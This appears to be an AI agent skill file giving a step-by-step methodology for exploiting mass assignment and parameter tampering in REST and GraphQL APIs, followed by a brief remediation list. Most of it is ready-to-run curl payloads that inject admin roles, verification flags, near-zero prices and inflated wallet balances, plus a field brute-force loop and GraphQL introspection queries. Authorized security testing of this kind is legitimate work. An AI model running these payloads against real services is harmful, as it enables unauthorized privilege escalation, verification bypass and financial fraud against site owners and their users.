---
name: mass-assignment
description: Detect and exploit mass assignment and parameter tampering across REST APIs GraphQL input objects and MVC frameworks injecting hidden fields such as role is_admin price balance and verified flags for privilege escalation and business impact.
---

# Mass Assignment & Parameter Tampering

## When to use this skill

- The target exposes REST or GraphQL endpoints that accept JSON bodies for creating or updating resources (registration, profile update, checkout, settings).
- You hold a low-privileged account and want to escalate to admin, bypass email verification, or manipulate prices, balances, discounts, and quotas.
- The backend uses a framework known for permissive model binding: Rails (strong params), Django (ModelForm), Laravel (Eloquent `fillable`/`guarded`), Node/Express with Mongoose, or Spring with lax data binding.
- Swagger/OpenAPI docs are exposed at `/docs`, `/api-docs`, `/swagger.json`, or `/openapi.json` and reveal writable schema fields.
- Client-side JS bundles leak hidden form inputs or field names that the server silently accepts.
- The API response echoes back the stored object, giving instant confirmation that an injected field persisted.

## Methodology

### 1. Field Discovery — Build the Candidate Field Checklist

Mass assignment only works if you can name the sensitive fields the server binds but never shows you. Harvest candidates from every surface before sending a single payload:

- **Privilege/role flags:** `is_admin`, `admin`, `role`, `roles`, `user_type`, `user_role`, `permissions`, `is_superuser`, `is_staff`, `group_id`
- **Verification/state flags:** `verified`, `email_verified`, `is_verified`, `status`, `active`, `approved`, `enabled`, `locked`
- **Financial/business fields:** `price`, `amount`, `balance`, `discount`, `coupon`, `credit`, `quota`, `limit`, `plan`, `tier`
- **Identity/ownership:** `user_id`, `owner_id`, `account_id`, `tenant_id`, `created_by`

Mine these surfaces for exact field names:

```bash
# 1. Swagger/OpenAPI definitions expose the full writable schema
curl -s https://target.com/api-docs | jq '.definitions.User.properties | keys'
curl -s https://target.com/docs/openapi.json | jq -r '.. | objects | select(has("properties")) | .properties | keys[]' | sort -u

# 2. Client JS bundles contain hidden form inputs and model field names
curl -s https://target.com/static/js/app.js | grep -oE '"(is_admin|admin|role|price|balance|verified|email_verified|status|permissions|discount|quota)[a-zA-Z_]*"' | sort -u

# 3. Hidden inputs in rendered HTML forms
curl -s https://target.com/settings | grep -oE '<input[^>]*type="hidden"[^>]*>'
```

Cross-reference every discovered name against the checklist; any field present in the schema but absent from the UI is a prime injection candidate.

### 2. Capture a Baseline and Diff the Response

Send the legitimate request first so you can later prove that your injected field — not a pre-existing one — changed state. Save both responses:

```bash
# Baseline: the normal profile update the app's own UI would send
curl -s -X PATCH https://target.com/api/v1/users/me \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"bio":"hello","website":"https://example.com"}' | tee baseline.json

# Same request with one injected field appended
curl -s -X PATCH https://target.com/api/v1/users/me \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"bio":"hello","website":"https://example.com","role":"admin"}' | tee injected.json

diff <(jq -S . baseline.json) <(jq -S . injected.json)
```

A diff showing `"role": "admin"` in the response is confirmation the field was bound and persisted — no further guessing needed.

### 3. Exploit — Inject Hidden Fields on POST/PATCH

The core pattern: take any valid JSON body and append fields the endpoint never asked for. Registration endpoints are the highest-value target because they create the account with attacker-controlled attributes from the first byte:

```bash
# Privilege escalation at registration
curl -s -X POST https://target.com/api/v1/register \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"Passw0rd!","name":"Bob","role":"admin","is_admin":true,"permissions":["*"]}'

# Verification bypass on an existing profile update
curl -s -X PATCH https://target.com/api/v1/users/me \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"email_verified":true,"verified":true,"status":"active"}'
```

Confirmation signals, in order of strength:

1. **Response echo:** the injected field reappears in the JSON response with your value.
2. **Behavioral change:** an admin-only route (`GET /admin/panel`) now returns `200` instead of `403`.
3. **Differential error:** adding the field flips the response from `422 Unprocessable Entity` to `200`, proving the binder saw it.

If one field name fails, iterate the checklist systematically — `role` vs `roles`, `is_admin` vs `admin` vs `isAdmin`:

```bash
for f in role roles is_admin admin isAdmin user_role permissions status; do
  curl -s -o /dev/null -w "%{http_code} $f\n" -X PATCH https://target.com/api/v1/users/me \
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -d "{\"$f\":\"admin\"}"
done
```

### 4. Framework-Specific Sink Analysis

Read the server-side binder to confirm which fields are bindable. Each framework fails differently:

**Rails** — strong params protect only when every controller permits exhaustively. Gaps: `params.permit!` (permits everything), forgotten `permit` calls on internal endpoints, and `accepts_nested_attributes_for` letting you write associated models through the parent:

```bash
# nested_attributes abuse: create/update an associated AdminProfile through /users
curl -s -X PATCH https://target.com/api/v1/users/me \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"Bob","admin_profile_attributes":{"role":"admin","level":10}}'
```

**Django** — a `ModelForm` with `fields = "__all__"` or an `exclude = [...]` list binds every model column not explicitly excluded; a forgotten `is_admin` column is bound automatically.

**Laravel** — Eloquent's `create($request->all())` respects `$fillable`, but `$guarded = []` (or a model declaring neither property) makes every column mass-assignable:

```bash
curl -s -X POST https://target.com/api/v1/users \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"email":"x@y.z","password":"Passw0rd!","is_admin":1,"balance":999999}'
```

**Node/Mongoose** — Express handlers that pass `req.body` straight into `Model.findOneAndUpdate(filter, req.body)` or `new Model(req.body)` have no allowlist by default; Mongoose binds every property in the body, including nested objects.

### 5. GraphQL Input Objects & Nested Object Injection

GraphQL resolvers that spread input into an ORM call (`User.update(args.input)`) may accept fields beyond the declared input type, and some servers forward unknown keys:

```bash
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation($i: UpdateUserInput!){ updateUser(input:$i){ id role emailVerified } }","variables":{"i":{"id":"1337","email":"a@b.c","role":"ADMIN","isAdmin":true,"emailVerified":true}}}'
```

Introspect first to enumerate every input type and its fields:

```bash
curl -s https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"UpdateUserInput\"){ inputFields{ name type{ name ofType{ name } } } } }"}'
```

For NoSQL backends, nested JSON bodies become operators: keys like `{"$set":{"role":"admin"}}` or `{"$where":"..."}` can reach the driver when `req.body` is passed through unfiltered.

### 6. Business Impact — Price, Balance, Discount & State Tampering

Mass assignment on commerce endpoints converts directly into financial loss. Any field that influences money is a target:

```bash
# Price tampering at order creation: client-supplied price overrides catalog price
curl -s -X POST https://target.com/api/v1/orders \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"sku":"SKU-001","quantity":1,"price":0.01,"discount":100,"total":0.01}'

# Wallet/credit inflation via profile or payment-method update
curl -s -X PATCH https://target.com/api/v1/wallet \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"balance":1000000,"credit":1000000,"quota":999999,"plan":"enterprise"}'

# Account state manipulation: unlock, approve, extend subscription
curl -s -X PATCH https://target.com/api/v1/users/me \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"status":"active","locked":false,"subscription_expires_at":"2099-12-31T00:00:00Z"}'
```

Validate impact end-to-end: place the tampered order, confirm the server charges the injected price, and check whether downstream services (invoices, payment gateway callbacks) trust client-supplied totals. Document each finding with the exact request, the echoed response, and the realized business effect (free order, inflated balance, admin access).

### Remediation

- **Allowlist bindable fields.** Never bind raw request bodies to models. Use explicit DTOs/schemas (`CreateUserDto`, Pydantic models, Go structs, Rails `permit(:email, :name)`) that enumerate every bindable field.
- **Deny by default.** In Laravel prefer `$fillable` over `$guarded = []`; in Django use `fields = [...]` instead of `exclude`; in Rails permit every param explicitly and audit for `permit!`.
- **Never trust client-supplied price, balance, discount, or totals.** Recompute them server-side from catalog and ledger data.
- **Separate privileged writes.** Role, permissions, status, and verification flags must be settable only through dedicated admin endpoints guarded by authorization checks — never through shared create/update paths.
- **Strip unknown keys** at the edge (middleware/validation layer) and log rejected unexpected fields for detection.
- **Test in CI:** add regression tests asserting that posting `{"role":"admin","is_admin":true,"price":0}` to public endpoints is ignored or rejected.
